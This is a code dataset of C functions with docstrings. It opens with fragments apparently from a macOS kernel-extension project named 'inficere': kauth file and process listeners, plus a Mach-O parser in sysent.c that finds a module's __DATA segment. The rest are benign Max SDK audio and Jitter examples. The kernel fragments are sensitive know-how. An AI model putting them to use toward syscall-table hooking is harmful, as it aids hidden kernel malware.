action=KAUTH_FILEOP_EXCHANGE, uid=%ld, file1=%s, file2=%s\\n\", (long)kauth_cred_getuid(cred), (const char *)arg0, (const char *)arg1);\n\t\t\t\t}\n\t\t\t}\n\t\t\t\n\t\t\tbreak;\n\t\t\t\n\t\tcase KAUTH_FILEOP_LINK:\n\t\t\tif((arg0 == 0) || (arg1 == 0)) {\n\t\t\t\tLOG_DEBUG(\"KAUTH_FILEOP_LINK\");\n\t\t\t} else {\n\t\t\t\tif((g_prefix == NULL) || (strprefix((const char *)arg0, g_prefix) || strprefix((const char *)arg1, g_prefix))) {\n\t\t\t\t\t//LOG_DEBUG(\"scope=\" KAUTH_SCOPE_FILEOP \", action=KAUTH_FILEOP_LINK, uid=%ld, original=%s, new=%s\\n\", (long)kauth_cred_getuid(cred), (const char *)arg0, (const char *)arg1);\n\t\t\t\t}\n\t\t\t}\n\t\t\t\n\t\t\tbreak;\n\t\t\t\n\t\tcase KAUTH_FILEOP_EXEC:\n\t\t\tif((g_prefix == NULL) || strprefix((const char *)arg1, g_prefix) ) {\n\t\t\t\t//LOG_DEBUG(\"scope=\" KAUTH_SCOPE_FILEOP \", action=KAUTH_FILEOP_EXEC, uid=%ld, vnode=0x%lx, path=%s\\n\",(long)kauth_cred_getuid(cred), (long)arg0, (const char *)arg1);\n\t\t\t}\n\t\t\t\n\t\t\tbreak;\n\t\t*/\n\t\tdefault:\n\t\t\t//LOG_DEBUG(\"[ERROR] Unknown action (%d)\\n\", action);\n\t\t\t\n\t\t\tbreak;\n\t}\n\t\n\tOSDecrementAtomic(&g_activation_count);\n\t\n\treturn KAUTH_RESULT_DEFER;\n}", "path": "kext\\inficere\\file_monitor.c", "repo_name": "enzolovesbacon/inficere", "stars": 123, "license": "bsd-3-clause", "language": "c", "size": 352}
{"docstring": "/*\n *\tA kauth listener that's called to authorize an action in the process scope (KAUTH_SCOPE_PROCESS)\n *\n *\tFor now, we just dump the parameters to the operation and return KAUTH_RESULT_DEFER, allowing other listeners to decide it's allowed or not\n *\n *\tSee the artile on the top of this file for a detailed explanation of 'arg0' through 'arg3'\n */\n", "func_signal": "static int process_scope_listener(kauth_cred_t cred, void *data, kauth_action_t action, uintptr_t arg0, uintptr_t arg1, uintptr_t arg2, uintptr_t arg3)", "code": "{\n\tOSIncrementAtomic(&g_activation_count);\n\t\n\tswitch(action) {\n\t\tcase KAUTH_PROCESS_CANSIGNAL:\n\t\t\tbreak;\n\t\tcase KAUTH_PROCESS_CANTRACE:\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tbreak;\n\t}\n\t\n\tOSDecrementAtomic(&g_activation_count);\n\t\n\treturn KAUTH_RESULT_DEFER;\n}", "path": "kext\\inficere\\file_monitor.c", "repo_name": "enzolovesbacon/inficere", "stars": 123, "license": "bsd-3-clause", "language": "c", "size": 352}
{"docstring": "/*\n *\tProcess target kernel module header and get some info we need, more specifically the __DATA segment\n */\n", "func_signal": "static int process_header(const mach_vm_address_t target_addr, uint64_t *data_addr, uint64_t *data_size)", "code": "{\n\t/* verify if it's a valid mach-o binary */\n\tstruct mach_header *mh = (struct mach_header *)target_addr;\n\t\n\tif(mh == NULL) {\n\t\t/* error */\n\t\treturn 1;\n\t}\n\t\n\tsize_t header_size = 0;\n\t\n\tif(mh->magic == MH_MAGIC) {\n\t\theader_size = sizeof(struct mach_header);\n\t} else if(mh->magic == MH_MAGIC_64) {\n\t\theader_size = sizeof(struct mach_header_64);\n\t} else {\n\t\t/* error */\n\t\treturn 1;\n\t}\n\t\n\t/* find the last command offset */\n\tstruct load_command *load_cmd = NULL;\n\tchar *load_cmd_addr = (char *)target_addr + header_size;\n\t\n\tfor(uint32_t i = 0; i < mh->ncmds; i++) {\n\t\tload_cmd = (struct load_command *)load_cmd_addr;\n\t\t\n\t\tswitch(load_cmd->cmd) {\n\t\t\tcase LC_SEGMENT:\n\t\t\t{\n\t\t\t\tstruct segment_command *seg_cmd = (struct segment_command *)load_cmd;\n\t\t\t\t\n\t\t\t\tif(strncmp(seg_cmd->segname, \"__DATA\", 16) == 0) {\n\t\t\t\t\t*data_addr = seg_cmd->vmaddr;\n\t\t\t\t\t*data_size = seg_cmd->vmsize;\n\t\t\t\t\t\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\t\t\n\t\t\tcase LC_SEGMENT_64:\n\t\t\t{\n\t\t\t\tstruct segment_command_64 *seg_cmd = (struct segment_command_64 *)load_cmd;\n\t\t\t\t\n\t\t\t\tif(strncmp(seg_cmd->segname, \"__DATA\", 16) == 0) {\n\t\t\t\t\t*data_addr = seg_cmd->vmaddr;\n\t\t\t\t\t*data_size = seg_cmd->vmsize;\n\t\t\t\t\t\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\t\t\n\t\t\tdefault:\n\t\t\t\tbreak;\n\t\t}\n\t\t\n\t\t/* advance to next command */\n\t\tload_cmd_addr += load_cmd->cmdsize;\n\t}\n\t\n\treturn 0;\n}", "path": "kext\\inficere\\sysent.c", "repo_name": "enzolovesbacon/inficere", "stars": 123, "license": "bsd-3-clause", "language": "c", "size": 352}
{"docstring": "//t_symbol *ps_change;\n", "func_signal": "t_jit_err jit_change_init(void)", "code": "{\n\tlong attrflags=0;\n\tt_jit_object *attr;\n\tt_jit_object *mop;\n\t\n\t_jit_change_class = jit_class_new(\"jit_change\",(method)jit_change_new,(method)jit_change_free,\n\t\tsizeof(t_jit_change),0L);\n\n\t//add mop\n\tmop = jit_object_new(_jit_sym_jit_mop,1,1);\n\tjit_class_addadornment(_jit_change_class,mop);\n\t//add methods\n\tjit_class_addmethod(_jit_change_class, (method)jit_change_matrix_calc, \"matrix_calc\", A_CANT, 0L);\n\t//add attributes\t\n\tattrflags = JIT_ATTR_GET_DEFER_LOW | JIT_ATTR_SET_USURP_LOW;\n\n\tCLASS_STICKY_CATEGORY(_jit_change_class,0,\"Behavior\");\n\tCLASS_STICKY_ATTR(_jit_change_class,\"basic\",0,\"1\");\n\t\n\tattr = jit_object_new(_jit_sym_jit_attr_offset,\"thresh\",_jit_sym_long,attrflags,\n\t\t(method)0L,(method)0L,calcoffset(t_jit_change,thresh));\n\tjit_class_addattr(_jit_change_class,attr);\n\tCLASS_ATTR_LABEL(_jit_change_class,\"thresh\",0,\"Threshold\");\t\n\t\n\tattr = jit_object_new(_jit_sym_jit_attr_offset,\"mode\",_jit_sym_char,attrflags,\n\t\t(method)0L,(method)0L,calcoffset(t_jit_change,mode));\n\tjit_class_addattr(_jit_change_class,attr);\n\tCLASS_ATTR_LABEL(_jit_change_class,\"mode\",0,\"Pass Mode\");\t\n\tCLASS_ATTR_ENUMINDEX2(_jit_change_class, \"mode\", 0, \"More-Than-Threshold\", \"Less-Than-Threshold\");\n\t\n\tCLASS_STICKY_CATEGORY_CLEAR(_jit_change_class);\n\tCLASS_STICKY_ATTR_CLEAR(_jit_change_class, \"basic\");\n\n\tattrflags = JIT_ATTR_GET_OPAQUE_USER | JIT_ATTR_SET_OPAQUE_USER;\n\tattr = jit_object_new(_jit_sym_jit_attr_offset,\"change\",_jit_sym_long,attrflags,\n\t\t(method)0L,(method)0L,calcoffset(t_jit_change,change));\n\tjit_class_addattr(_jit_change_class,attr);\n\t\n\tjit_class_register(_jit_change_class);\n\t\n//\tps_change = gensym(\"change\");\n\n\treturn JIT_ERR_NONE;\n}", "path": "examples\\matrix\\jit.change\\jit.change.c", "repo_name": "Cycling74/max6-sdk", "stars": 107, "license": "None", "language": "c", "size": 8623}
{"docstring": "// here's where we set the buffer~ we're going to access\n", "func_signal": "void index_set(t_index *x, t_symbol *s)", "code": "{\n\tif (!x->l_buffer_reference)\n\t\tx->l_buffer_reference = buffer_ref_new((t_object*)x, s);\n\telse\n\t\tbuffer_ref_set(x->l_buffer_reference, s);\n}", "path": "examples\\audio\\index~\\index~.c", "repo_name": "Cycling74/max6-sdk", "stars": 107, "license": "None", "language": "c", "size": 8623}
{"docstring": "/************************************************************************************/\n", "func_signal": "int C74_EXPORT main(void)", "code": "{\n\tt_class\t*c;\n\t\n\tcommon_symbols_init();\n\tc = class_new(\"dict.route\", (method)dict_route_new, (method)dict_route_free, sizeof(t_dict_route), (method)NULL, A_GIMME, 0);\n\n\tclass_addmethod(c, (method)dict_route_dictionary, \t\"dictionary\", \tA_SYM, 0);\n    class_addmethod(c, (method)dict_route_assist,\t\t\"assist\",\t\tA_CANT, 0);\n\t\n\tclass_register(_sym_box, c);\n\ts_dict_route_class = c;\n\treturn 0;\n}", "path": "examples\\dictionary\\dict.route\\dict.route.c", "repo_name": "Cycling74/max6-sdk", "stars": 107, "license": "None", "language": "c", "size": 8623}
{"docstring": "//recursive function to handle higher dimension matrices, by processing 2D sections at a time \n", "func_signal": "void jit_keyscreen_calculate_ndim(t_jit_keyscreen *x, long dimcount, long *dim, long planecount, \n\tt_jit_matrix_info *in_minfo, char *bip, t_jit_matrix_info *in2_minfo, char *bip2, \n\tt_jit_matrix_info *in3_minfo, char *bip3, t_jit_matrix_info *out_minfo, char *bop)", "code": "{\n\tlong i,j,i1,j1,width,height, rowoffset, coloffset, rowstep, colstep;\n\tuchar *ip,*ip2,*ip3,*op,*src3,*src2,*src,*dst,*ksrc,*tsrc,*msrc;\n\tlong kstride,tstride,mstride,ostride;\n\tlong alpha, red, green, blue, af, rf, gf, bf, mode, key, target, mask, check=0;\n\tlong aMf, aPf, rMf, rPf, gMf, gPf, bMf, bPf;\n\n\t// get all the struct variables into locals and scale them into integers\n\n\tmode = x->mode;\n\n\talpha = x->alpha*255.;\n\tred = x->red*255.;\n\tgreen = x->green*255.;\n\tblue = x->blue*255.;\n\taf = x->alphatol*255.;\n\trf = x->redtol*255.;\n\tgf = x->greentol*255.;\n\tbf = x->bluetol*255.;\n\n\tkey = x->key;\n\ttarget = x->target;\n\tmask = x->mask;\n\t\n\taMf = alpha - af;\n\taPf = alpha + af;\n\trMf = red - rf;\n\trPf = red + rf;\n\tgMf = green - gf;\n\tgPf = green + gf;\n\tbMf = blue - bf;\n\tbPf = blue + bf;\n\n\t\t\t\t\n\tif (dimcount<1) return; //safety\n\t\n\tswitch(dimcount) {\n\tcase 1:\n\t\tdim[1]=1;\n\tcase 2:\n\t\twidth  = dim[0];\n\t\theight = dim[1];\n\n\t\t// map the input sources to the right pointers and rowstrides\n\t\t\n\t\tksrc = (key==1) ? bip3 : (key==2) ? bip2 : bip;\n\t\ttsrc = (target==0) ? bip : (target==2) ? bip2 : bip3;\n\t\tmsrc = (mask==0) ? bip : (mask==1) ? bip3 : bip2;\n\n\t\tkstride = (key==1) ? in3_minfo->dimstride[1] : (key==2) ? in2_minfo->dimstride[1] : in_minfo->dimstride[1];\n\t\ttstride = (target==0) ? in_minfo->dimstride[1] : (target==2) ? in2_minfo->dimstride[1] : in3_minfo->dimstride[1];\n\t\tmstride = (mask==1) ? in_minfo->dimstride[1] : (mask==1) ? in3_minfo->dimstride[1] : in2_minfo->dimstride[1];\n\n\t\tostride=out_minfo->dimstride[1];\n\n\t\t\t// which mode of keying?\t\n\t\t\tswitch(mode) {\n\t\t\tcase(1): \t// plane-by-plane\n\t\t\t\tfor (i=0;i<height;i++){\n\t\t\t\t\tip = ksrc + i*kstride;\n\t\t\t\t\tip2 = tsrc + i*tstride;\n\t\t\t\t\tip3 = msrc + i*mstride;\n\t\t\t\t\top = bop + i*ostride;\n\t\t\t\t\t\t\n\t\t\t\t\tfor (j=0;j<width;j++,ip+=4,ip2+=4,ip3+=4) { // to key or not to key\n\t\t\t\t\t\t*op++ = (*(ip)>=aMf&&*(ip)<=aPf) ? *ip3 : *ip2;\n\t\t\t\t\t\t*op++ = (*(ip+1)>=rMf&&*(ip+1)<=rPf) ? *(ip3+1) : *(ip2+1);\n\t\t\t\t\t\t*op++ = (*(ip+2)>=gMf&&*(ip+2)<=gPf) ? *(ip3+2) : *(ip2+2);\n\t\t\t\t\t\t*op++ = (*(ip+3)>=bMf&&*(ip+3)<=bPf) ? *(ip3+3) : *(ip2+3);\t\t\t\t\t\t\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\tbreak;\n\t\t\tcase(0): // cell-by-cell\n\t\t\tdefault:\n\t\t\t\tfor (i=0;i<height;i++){\n\t\t\t\t\tt_uint32 *op32;\n\n\t\t\t\t\tip = ksrc + i * kstride;\n\t\t\t\t\tip2 = tsrc + i * tstride;\n\t\t\t\t\tip3 = msrc + i * mstride;\n\t\t\t\t\top = bop + i*ostride;\n\t\t\t\t\top32 = (t_uint32*)op;\n\t\t\t\t\t\t\n\t\t\t\t\tfor (j=0;j<width;j++, ip+=4, ip2+=4,ip3+=4) {\t\t\t\n\t\t\t\t\t\t// see if any of the planes fail any of the criteria, and key accordingly\n\t\t\t\t\t\t*op32++ = (*ip<aMf) ? *((t_uint32 *)ip2) : (*ip>aPf) ? *((t_uint32 *)ip2) : (*(ip+1)<rMf) ? *((t_uint32 *)ip2) : (*(ip+1)>rPf) ? *((t_uint32 *)ip2) : (*(ip+2)<gMf) ? *((t_uint32 *)ip2) : (*(ip+2)>gPf) ? *((t_uint32 *)ip2) : (*(ip+3)<bMf) ? *((t_uint32 *)ip2) : (*(ip+3)>bPf) ? *((t_uint32 *)ip2) : *((t_uint32 *)ip3);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\tbreak;\n\t\t\t}\n\t\tbreak;\n\tdefault:\n\t\tfor\t(i=0;i<dim[dimcount-1];i++) {\n\t\t\tip = bip + i * in_minfo->dimstride[dimcount-1];\n\t\t\tip2 = bip2 + i * in2_minfo->dimstride[dimcount-1];\n\t\t\tip3 = bip3 + i * in3_minfo->dimstride[dimcount-1];\n\t\t\top = bop + i * out_minfo->dimstride[dimcount-1];\n\t\t\tjit_keyscreen_calculate_ndim(x,dimcount-1,dim,planecount,in_minfo,ip,in2_minfo,ip2,in3_minfo,ip3,out_minfo,op);\n\t\t}\n\t}\n}", "path": "examples\\matrix\\jit.keyscreen\\jit.keyscreen.c", "repo_name": "Cycling74/max6-sdk", "stars": 107, "license": "None", "language": "c", "size": 8623}
{"docstring": "/************************************************************************************/\n", "func_signal": "void dict_route_assist(t_dict_route *x, void *b, long m, long a, char *s)", "code": "{\n\tif (m==ASSIST_INLET) {\n\t\tswitch (a) {\n\t\t\tcase 0: strcpy(s, \"dictionary output routeped of specified keys\"); break;\n\t\t\tcase 1: strcpy(s, \"series of key/value pairs routed from the dictionary\"); break;\n\t\t}\n\t\tstrcpy(s, \"dictionary input\");\n\t}\n\telse if (m==ASSIST_OUTLET) {\n\t\tswitch (a) {\n\t\t\tcase 0: strcpy(s, \"dictionary matching specified keys/values\"); break;\n\t\t\tcase 1: strcpy(s, \"dictionary not-matching specified keys/values\"); break;\n\t\t}\n\t}\n}", "path": "examples\\dictionary\\dict.route\\dict.route.c", "repo_name": "Cycling74/max6-sdk", "stars": 107, "license": "None", "language": "c", "size": 8623}
{"docstring": "//\tCLASS_ATTR_ORDER(c, \"val\", 0, \"1\");\n//\tCLASS_ATTR_ORDER(c, \"usemax\", 0, \"-1\");\n//\tCLASS_ATTR_ACCESSORS(c, \"min\", (method)attrtester_min_get, (method)attrtester_min_set);\n//\tCLASS_ATTR_STYLE_LABEL(c, \"usemin\", 0, \"onoff\", \"Use Minimum\");\n//\tCLASS_ATTR_INVISIBLE(c, \"val\", 0);\n//\tCLASS_ATTR_SAVE(c, \"min\", 0, \"0\");\n//\tCLASS_ATTR_ATTR_PARSE(c, \"float\", \"undocumented\", gensym(\"long\"), 0, \"1\");\n", "func_signal": "int C74_EXPORT main(void)", "code": "{\t\n\tt_class *c;\n\t\n\tc = class_new(\"attrtester\", (method)attrtester_new, (method)attrtester_free, (long)sizeof(t_attrtester), 0L, A_GIMME, 0);\n\n    class_addmethod(c, (method)attrtester_bang, \"bang\", 0);\n    class_addmethod(c, (method)attrtester_int, \"int\", A_LONG, 0);\n    class_addmethod(c, (method)attrtester_float, \"float\", A_FLOAT, 0);\n\t\n    class_addmethod(c, (method)attrtester_assist,\t\t\t\"assist\",\t\tA_CANT, 0);  \n\n\t/* Inspector items ARE ATTRIBUTES */\n\tCLASS_ATTR_LONG(c, \"min\", 0, t_attrtester, a_min);\n\tCLASS_ATTR_SAVE(c, \"min\", 0);\n\t// override default accessors\n\tCLASS_ATTR_ACCESSORS(c, \"min\", (method)attrtester_min_get, (method)attrtester_min_set);\n\n\tCLASS_ATTR_LONG(c, \"max\", 0, t_attrtester, a_max);\n\t// clip max value to 0-100\n\tCLASS_ATTR_FILTER_CLIP(c, \"max\", 0, 100);\n\t\n\tCLASS_ATTR_CHAR(c, \"usemin\", 0, t_attrtester, a_usemin);\n\tCLASS_ATTR_CHAR(c, \"usemax\", 0, t_attrtester, a_usemax);\n\t\n\t// read-only\n\tCLASS_ATTR_LONG(c, \"val\", 0 /*ATTR_SET_OPAQUE_USER*/, t_attrtester, a_val);\n\t\n\tCLASS_ATTR_CATEGORY(c, \"val\", 0, \"Value\"); // define 'Value' category\n\t\n\tCLASS_ATTR_ORDER(c, \"val\", 0, \"1\"); // top of the list\n\tCLASS_ATTR_ORDER(c, \"usemax\", 0, \"-1\"); // bottom of the list\n\t\n\t// index-based enumeration style\n\tCLASS_ATTR_ENUMINDEX(c, \"val\", 0, \"zero one two \\\"three four\\\" five\");\n\t// set the label without setting the style\n\tCLASS_ATTR_LABEL(c, \"val\", 0, \"Enumerated Value\");\n\tCLASS_ATTR_INVISIBLE(c, \"val\", 0); // hide attribute from inspector\n\t\n\t\t\t\t\t\t\t\t\t\t/* style */  /* label */\n\tCLASS_ATTR_STYLE_LABEL(c, \"usemin\", 0, \"onoff\", \"Use Minimum\");\n\tCLASS_ATTR_STYLE_LABEL(c, \"usemax\", 0, \"onoff\", \"Use Maximum\");\n\n\tclass_register(CLASS_BOX, c);\n\tattrtester_class = c;\n\n\tpost(\"I am the attrtester object\");\n\treturn 0;\n}", "path": "examples\\basics\\attrtester\\attrtester.c", "repo_name": "Cycling74/max6-sdk", "stars": 107, "license": "None", "language": "c", "size": 8623}
{"docstring": "//recursive function to handle higher dimension matrices, by processing 2D sections at a time \n", "func_signal": "t_jit_err jit_change_calculate_ndim(long dimcount, long *dim, long planecount, \n\tt_jit_change_vecdata *vecdata, t_jit_matrix_info *in_minfo, char *bip, \n\tt_jit_matrix_info *out_minfo, char *bop, char mode)", "code": "{\n\tlong i,j,n;\n\tchar *ip=bip, *op=bop;\n\tt_jit_op_info in_opinfo, out_opinfo;\n\t\t\n\tif (dimcount<1) return 0; //safety\n\t\n\tswitch(dimcount) {\n\tcase 1:\n\t\tdim[1]=1;\n\tcase 2:\n\t\tswitch(mode) {\n\t\tcase 1:\n\t\t\tn = dim[0];\n\t\t\tin_opinfo.stride = in_minfo->dim[0]>1?in_minfo->planecount:0;\n\t\t\tout_opinfo.stride = out_minfo->dim[0]>1?out_minfo->planecount:0;\n\t\t\tif (in_minfo->type==_jit_sym_char) {\n\t\t\t\tswitch (planecount) {\n\t\t\t\tcase 1:\n\t\t\t\t\tfor (i=0;i<dim[1];i++){\n\t\t\t\t\t\tin_opinfo.p = bip + i*in_minfo->dimstride[1];\n\t\t\t\t\t\tout_opinfo.p = bop  + i*out_minfo->dimstride[1];\n\t\t\t\t\t\tif (jit_change_vector_char_plane1(n,&(vecdata->v_char),&in_opinfo,&out_opinfo)) {\n\t\t\t\t\t\t\treturn 0;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\treturn 1;\n\t\t\t\t\tbreak;\n\t\t\t\tcase 4:\n\t\t\t\t\tfor (i=0;i<dim[1];i++){\n\t\t\t\t\t\tin_opinfo.p = bip + i*in_minfo->dimstride[1];\n\t\t\t\t\t\tout_opinfo.p = bop  + i*out_minfo->dimstride[1];\n\t\t\t\t\t\tif (jit_change_vector_char_plane4(n,&(vecdata->v_char),&in_opinfo,&out_opinfo)) {\n\t\t\t\t\t\t\treturn 0;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\treturn 1;\n\t\t\t\t\tbreak;\n\t\t\t\tdefault:\n\t\t\t\t\tfor (i=0;i<dim[1];i++){\n\t\t\t\t\t\tin_opinfo.p = bip + i*in_minfo->dimstride[1];\n\t\t\t\t\t\tout_opinfo.p = bop  + i*out_minfo->dimstride[1];\n\t\t\t\t\t\tif (jit_change_vector_char(n,&(vecdata->v_char),&in_opinfo,&out_opinfo)) {\n\t\t\t\t\t\t\treturn 0;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\treturn 1;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t\telse if (in_minfo->type==_jit_sym_long) {\n\t\t\t\tfor (i=0;i<dim[1];i++){\n\t\t\t\t\tin_opinfo.p = bip + i*in_minfo->dimstride[1];\n\t\t\t\t\tout_opinfo.p = bop  + i*out_minfo->dimstride[1];\n\t\t\t\t\tif (jit_change_vector_long(n,&(vecdata->v_long),&in_opinfo,&out_opinfo)) {\n\t\t\t\t\t\treturn 0;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\treturn 1;\n\t\t\t}\n\t\t\telse if (in_minfo->type==_jit_sym_float32) {\n\t\t\t\tfor (i=0;i<dim[1];i++){\n\t\t\t\t\tin_opinfo.p = bip + i*in_minfo->dimstride[1];\n\t\t\t\t\tout_opinfo.p = bop  + i*out_minfo->dimstride[1];\n\t\t\t\t\tif (jit_change_vector_float32(n,&(vecdata->v_float32),&in_opinfo,&out_opinfo)) {\n\t\t\t\t\t\treturn 0;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\treturn 1;\n\t\t\t}\n\t\t\telse if (in_minfo->type==_jit_sym_float64) {\n\t\t\t\tfor (i=0;i<dim[1];i++){\n\t\t\t\t\tin_opinfo.p = bip + i*in_minfo->dimstride[1];\n\t\t\t\t\tout_opinfo.p = bop  + i*out_minfo->dimstride[1];\n\t\t\t\t\tif (jit_change_vector_float64(n,&(vecdata->v_float64),&in_opinfo,&out_opinfo)) {\n\t\t\t\t\t\treturn 0;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\treturn 1;\n\t\t\t}\n\t\t\tbreak;\n\t\tcase 0:\n\t\tdefault:\n\t\t\tn = dim[0];\n\t\t\tin_opinfo.stride = in_minfo->dim[0]>1?in_minfo->planecount:0;\n\t\t\tout_opinfo.stride = out_minfo->dim[0]>1?out_minfo->planecount:0;\n\t\t\tif (in_minfo->type==_jit_sym_char) {\n\t\t\t\tswitch (planecount) {\n\t\t\t\tcase 1:\n\t\t\t\t\tfor (i=0;i<dim[1];i++){\n\t\t\t\t\t\tin_opinfo.p = bip + i*in_minfo->dimstride[1];\n\t\t\t\t\t\tout_opinfo.p = bop  + i*out_minfo->dimstride[1];\n\t\t\t\t\t\tif (jit_change_vector_char_plane1(n,&(vecdata->v_char),&in_opinfo,&out_opinfo)) {\n\t\t\t\t\t\t\treturn 1;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\tbreak;\n\t\t\t\tcase 4:\n\t\t\t\t\tfor (i=0;i<dim[1];i++){\n\t\t\t\t\t\tin_opinfo.p = bip + i*in_minfo->dimstride[1];\n\t\t\t\t\t\tout_opinfo.p = bop  + i*out_minfo->dimstride[1];\n\t\t\t\t\t\tif (jit_change_vector_char_plane4(n,&(vecdata->v_char),&in_opinfo,&out_opinfo)) {\n\t\t\t\t\t\t\treturn 1;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\tbreak;\n\t\t\t\tdefault:\n\t\t\t\t\tfor (i=0;i<dim[1];i++){\n\t\t\t\t\t\tin_opinfo.p = bip + i*in_minfo->dimstride[1];\n\t\t\t\t\t\tout_opinfo.p = bop  + i*out_minfo->dimstride[1];\n\t\t\t\t\t\tif (jit_change_vector_char(n,&(vecdata->v_char),&in_opinfo,&out_opinfo)) {\n\t\t\t\t\t\t\treturn 1;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t\telse if (in_minfo->type==_jit_sym_long) {\n\t\t\t\tfor (i=0;i<dim[1];i++){\n\t\t\t\t\tin_opinfo.p = bip + i*in_minfo->dimstride[1];\n\t\t\t\t\tout_opinfo.p = bop  + i*out_minfo->dimstride[1];\n\t\t\t\t\tif (jit_change_vector_long(n,&(vecdata->v_long),&in_opinfo,&out_opinfo)) {\n\t\t\t\t\t\treturn 1;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\telse if (in_minfo->type==_jit_sym_float32) {\n\t\t\t\tfor (i=0;i<dim[1];i++){\n\t\t\t\t\tin_opinfo.p = bip + i*in_minfo->dimstride[1];\n\t\t\t\t\tout_opinfo.p = bop  + i*out_minfo->dimstride[1];\n\t\t\t\t\tif (jit_change_vector_float32(n,&(vecdata->v_float32),&in_opinfo,&out_opinfo)) {\n\t\t\t\t\t\treturn 1;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\telse if (in_minfo->type==_jit_sym_float64) {\n\t\t\t\tfor (i=0;i<dim[1];i++){\n\t\t\t\t\tin_opinfo.p = bip + i*in_minfo->dimstride[1];\n\t\t\t\t\tout_opinfo.p = bop  + i*out_minfo->dimstride[1];\n\t\t\t\t\tif (jit_change_vector_float64(n,&(vecdata->v_float64),&in_opinfo,&out_opinfo)) {\n\t\t\t\t\t\treturn 1;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\tbreak;\n\t\t}\n\t\tbreak;\n\tdefault:\n\t\tfor\t(i=0;i<dim[dimcount-1];i++) {\n\t\t\tip = bip + i*in_minfo->dimstride[dimcount-1];\n\t\t\top = bop + i*out_minfo->dimstride[dimcount-1];\n\t\t\tjit_change_calculate_ndim(dimcount-1,dim,planecount,vecdata,in_minfo,ip,out_minfo,op, mode);\n\t\t}\n\t}\n\treturn 0;\n}", "path": "examples\\matrix\\jit.change\\jit.change.c", "repo_name": "Cycling74/max6-sdk", "stars": 107, "license": "None", "language": "c", "size": 8623}
{"docstring": "// Perform (signal) Method for 1 input signal, 64-bit MSP\n", "func_signal": "void split_perform164(t_split *x, t_object *dsp64, double **ins, long numins, double **outs, long numouts, long sampleframes, long flags, void *userparam)", "code": "{\n\tt_double\t*in1 = ins[0];\t\t// Input 1\n\tt_double\t*out1 = outs[0];\t\t// Output 1\n\tt_double\t*out2 = outs[1];\t\t// Output 2\n\tt_double\t*out3 = outs[2];\t\t// Output 3\n\tint\t\t\tn = sampleframes;\n\tt_double\tvalue;\n\tt_double\tlow = x->s_low;\t\t// cache struct object members locally to keep them in registers on the processor\n\tt_double\thigh = x->s_high;\t// ... thus improving performance.\n\t\n\twhile (n--) {\n\t\tvalue = *in1++;\n\t\tif ((value >= low) && (value <= high)){\t\n\t\t\t*out1++ = value;\n\t\t\t*out2++ = 0;\n\t\t\t*out3++ = 1;\n\t\t}\n\t\telse {\n\t\t\t*out1++ = 0;\n\t\t\t*out2++ = value;\n\t\t\t*out3++ = 0; \t \t\n\t\t}\t\t\t\t\t\t\t\t\t\t\t\n\t}\n}", "path": "examples\\audio\\split~\\split~.c", "repo_name": "Cycling74/max6-sdk", "stars": 107, "license": "None", "language": "c", "size": 8623}
{"docstring": "//***********************************************************************************************\n", "func_signal": "void split_assist(t_split *x, void *b, long msg, long arg, char *dst)", "code": "{\n\tif (msg == ASSIST_INLET) {\n\t\tswitch (arg) {\n\t\t\tcase 0: strcpy(dst, \"(signal) Value to be sent to one of the 2 outlets\"); break;\n\t\t\tcase 1: strcpy(dst, \"(signal/float) Set lower limit for left outlet\"); break;\n\t\t\tcase 2: strcpy(dst, \"(signal/float) Set upper limit for left outlet\"); break;\n\t\t}\n\t}\n\telse if (msg == ASSIST_OUTLET){\n\t\tswitch (arg) {\n\t\t\tcase 0: strcpy(dst, \"(signal) Input if within limits\"); break;\n\t\t\tcase 1: strcpy(dst, \"(signal) Input if not within limits\"); break;\n\t\t\tcase 2: strcpy(dst, \"(signal) Comparison result (1 or 0)\"); break;\n\t\t}\n\t}\n}", "path": "examples\\audio\\split~\\split~.c", "repo_name": "Cycling74/max6-sdk", "stars": 107, "license": "None", "language": "c", "size": 8623}
{"docstring": "// DSP Methods\n", "func_signal": "void split_dsp(t_split *x, t_signal **sp, short *count)", "code": "{\n\tshort i;\n\t\n\tfor (i=0; i<6; i++)\n\t\tx->s_connected[i] = count[i];\n\t\n\tif (count[1] || count[2])\t// IF the 2nd or 3rd inlet has a signal connected to it...\n\t\tdsp_add(split_perform3, 8, sp[0]->s_vec, sp[1]->s_vec, sp[2]->s_vec,\n\t\t\t\tsp[3]->s_vec, sp[4]->s_vec, sp[5]->s_vec, x, sp[0]->s_n);\t\n\telse\t\n\t\tdsp_add(split_perform1, 6, sp[0]->s_vec, \n\t\t\t\tsp[3]->s_vec, sp[4]->s_vec, sp[5]->s_vec, x, sp[0]->s_n);\t\n}", "path": "examples\\audio\\split~\\split~.c", "repo_name": "Cycling74/max6-sdk", "stars": 107, "license": "None", "language": "c", "size": 8623}
